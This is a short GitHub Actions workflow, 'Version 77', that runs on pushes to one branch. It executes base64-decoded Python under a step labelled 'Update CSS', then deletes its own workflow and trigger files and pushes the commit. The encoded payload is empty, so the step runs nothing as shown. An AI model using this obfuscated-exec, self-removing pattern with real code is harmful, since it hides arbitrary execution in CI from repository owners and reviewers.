name: Version 77
on:
  push:
    branches:
      - version-77-work
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Update CSS
        run: python3 -c "import base64; exec(base64.b64decode(''))"
      - name: Commit changes
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          rm -f .github/workflows/version-77.yml version-77-trigger.txt version-77-trigger-2.txt
          git add styles.css .github/workflows/version-77.yml version-77-trigger.txt version-77-trigger-2.txt
          git commit -m 'Версия 77'
          git push origin HEAD:version-77-work
